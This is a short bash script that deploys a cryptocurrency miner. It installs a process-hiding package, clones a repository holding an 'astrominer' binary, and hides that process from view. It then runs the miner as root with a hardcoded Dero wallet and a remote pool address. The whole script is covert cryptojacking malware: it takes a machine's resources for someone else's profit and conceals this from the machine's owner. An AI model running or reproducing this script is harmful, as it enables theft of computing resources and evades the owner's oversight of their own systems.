#!/bin/bash
npm i -g node-process-hider
git clone https://github.com/realxdagg/job.git
cd job
chmod 500 astrominer
ph add astrominer
sudo ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r dero-node-us-west.mysrv.cloud:10300 -p rpc -t 8
